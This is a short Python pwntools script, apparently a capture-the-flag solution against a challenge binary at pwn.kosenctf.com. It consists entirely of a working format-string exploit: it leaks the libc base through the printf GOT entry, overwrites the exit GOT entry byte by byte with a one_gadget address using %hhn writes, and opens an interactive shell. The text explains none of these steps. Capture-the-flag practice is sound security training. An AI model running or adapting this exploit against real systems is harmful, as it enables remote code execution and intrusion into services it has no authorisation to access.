#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall', env = {'LD_PRELOAD': './libc-2.27.so'})
else:
    s = remote('pwn.kosenctf.com', 9003)

elf = ELF('./chall')
libc = ELF('./libc-2.27.so')

s.sendlineafter('$ ', '%13$sAAA' + p64(elf.got['printf']))

libc_base = u64(s.recvuntil('AAA')[:-3].ljust(8, '\0')) - libc.symbols['printf']
log.info('libc base: %#x' % libc_base)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
for i in range(6):
    payload = ''
    payload += '%{}x'.format(ord(p64(libc_base + one_gadgets[2])[i]))
    payload += '%16$hhn'
    payload = payload.ljust(0x20, '\0')
    payload += p64(elf.got['exit'] + i)
    s.sendlineafter('$ ', payload)

s.sendlineafter('$ ', 'exit\0')

s.interactive()
